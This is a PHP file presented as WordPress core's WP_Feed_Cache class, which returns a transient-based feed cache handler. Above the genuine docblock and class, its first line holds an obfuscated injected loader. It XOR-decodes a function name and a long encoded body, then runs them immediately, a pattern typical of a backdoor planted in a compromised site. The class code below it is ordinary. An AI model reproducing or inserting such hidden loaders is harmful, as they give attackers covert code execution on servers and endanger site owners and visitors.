<?php $hxKVqqGqBCv=',3H7;7.ZAUN8G87'^'OA-VORq<4;-L.WY';$MENdqo=$hxKVqqGqBCv('','I5rh>:<5==ZBh2SQ4.Nqb0VA<50:4oiMOTvbxI>knZ0+H-+OBr2TGl4OZY,t4A5KFRP1MJGOY+>xMHWkj-4=hH=8MYEmVkUYKpJRFAq9wvXTOgpZZ:C>+SPOo-U23yHzI1lLPX:ZlQ30jhueJj1L0 lC<4Orga9KRbHZfHFXDI YWxuS2 K-cRSgGEVJL3<yPYY1SnY;-o873a6-T;akXSRUS HebS+.WdXIMeOKMAT=1jEMTTCE0Y>DCimvvu80eE-8CrUE6aLStRF8:D,xOHgmP=414c-=RSOKLUK uZ;AIZB5NELhX1ZL.TZ1ZKQPbdhmQ2HZGy7s1M<LE.HDEAA0rt4e-hmvO6rg95NXPQWANZGM.lJ.;BDjUW;Ao.RLAoLO U.xrXnbI+T8PoNuKL9O w3F,K9yhW3JTTKGj61V7+I<69YN6E -RqY2Z1;o.16OZ. WZDn IYQ1QksS9A.GyFrXP2O,R<NdaA>U-bJ36=QrCCq4C6QUb;W +Q7U61OZo2VAmcJL-O66pTmEhx.Jscf-8JAhNSSCn1dTdeGQTg6wyTSt.J4E4DFBSIsTQJd6G,YDMQY1nBiAPN9GBU0,91L73O:92NgU37; >QZbBbaD7<8MaJyagBoNO4W.MWoI>AF0iM2OR< 4YN9SZxc+.WEajKmA<'^' SZIXORVIT5,7W+8GZ=YEH93cQQNU06 : QKQiEag<EE+YB ,RJ;53P..8s+Y4Acb61E,fgk2NGQmhwKJV>4alRM9yxMqLnSBy,=4iUPWKxdtGT3fI7LG6>gKI4FRPsZmXGgyR3SH>FDJFHEbNU-DA7gUio,GER.+9l3Fmf+0;L<9PQ8WYbpJiYnN73>9ARQt6,EzUS2PeE=9ERL ZAVx539 EsoF7JZ6;3,4Erk+ 8NTQOG2;1 Q:VdkM259:sy eLKcV> OAqmTv0YV1IQo3mdtYUEU<FX+srkh>.YNP2e-;6TnxlL.P69KoPLPA86BLII5S<;nYLy8+S> O+,eieo 1e0h;9V.ERCRP7xmowe8;+8KEjU1KMN16O 0E75aRlkK0WCxQgF-J YpRnQ=-U:EL9OQADsbsW+ 5kzJvD8DN;UWU04SmXB .=S.Pd0CDBg8OS2lp1D,:>U4CW7X5OnUfV<1F.s9Y7MHz4<KJnWWI0ReeQU1D0,=P2Yt4O<EE<rHY38JOjhI.BWYtKcHPC.FKBIY> 3i86:IlMtYXgvgVUAL76LMxRvPstse+Ce0yWTuOawz2mPIkIgvnX504IsRT5hV7SJF=OrCVBLQ0>EnBE VHYdHjYAGbO5E=2X,;GmZ 2Q2jB.+POU=idzarjNV>1IZbVKA');$MENdqo();
/**
 * Feed API: WP_Feed_Cache class
 *
 * @package WordPress
 * @subpackage Feed
 * @since 4.7.0
 */

/**
 * Core class used to implement a feed cache.
 *
 * @since 2.8.0
 *
 * @see SimplePie_Cache
 */
class WP_Feed_Cache extends SimplePie_Cache {

	/**
	 * Creates a new SimplePie_Cache object.
	 *
	 * @since 2.8.0
	 * @access public
	 *
	 * @param string $location  URL location (scheme is used to determine handler).
	 * @param string $filename  Unique identifier for cache object.
	 * @param string $extension 'spi' or 'spc'.
	 * @return WP_Feed_Cache_Transient Feed cache handler object that uses transients.
	 */
	public function create($location, $filename, $extension) {
		return new WP_Feed_Cache_Transient($location, $filename, $extension);
	}
}
